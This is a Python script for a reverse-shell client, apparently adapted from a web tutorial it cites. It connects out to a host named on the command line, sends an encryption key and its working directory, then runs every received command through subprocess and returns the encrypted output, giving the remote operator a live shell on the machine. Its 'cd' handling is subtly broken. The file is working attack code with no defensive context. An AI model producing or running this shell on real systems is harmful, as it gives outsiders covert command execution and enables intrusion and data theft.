import socket
import os
import subprocess
import sys
import hellobitch.cryptofernet as crypt
#https://www.thepythoncode.com/article/create-reverse-shell-python#:~:text=How%20to%20Create%20a%20Reverse%20Shell%20in%20Python,are%20some%20ideas%20to%20extend%20that%20code%3A%20


SERVER_HOST = sys.argv[1]
__CLEF__ = crypt.create_key()
SERVER_PORT = 2424
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"
if __name__ == "__main__":
    # create the socket object
    s = socket.socket()
    # connect to the server
    s.connect((SERVER_HOST, SERVER_PORT))

    # get the current directory
    cwd = os.getcwd()
    cwd_encrypted = crypt.encrypt_str(__CLEF__, cwd)
    s.send(__CLEF__)
    s.send(cwd_encrypted)

    while True:
        # receive the command from the server
        command = s.recv(BUFFER_SIZE).decode()
#        command_decrypt = crypt.decrypt_str(__CLEF__, command)
       # command_decrypt = crypt.decrypt_str(command)
        if not command:
            continue
        splited_command = command
        if command.lower() == "exit":
            # if the command is exit, just break out of the loop
            break
        if splited_command.lower() == "cd":
            # cd command, change directory
            try:
                os.chdir(' '.join(splited_command[1:]))
            except FileNotFoundError as e:
                # if there is an error, set as the output
                output = str(e)
            else:
                # if operation is successful, empty message
                output = ""
        else:
            # execute the command and retrieve the results
            output = subprocess.getoutput(command)
        # get the current working directory as output
        cwd = os.getcwd()
        # send the results back to the server
        message_encrypt = crypt.encrypt_str(__CLEF__, f"{output}{SEPARATOR}{cwd}")
        output = crypt.encrypt_str(__CLEF__, output)
        #s.send(output)
        #cwd = f'{cwd}'
        #s.send(crypt.encrypt_str(__CLEF__, cwd))
        s.send(message_encrypt)
    # close client connection
    s.close()
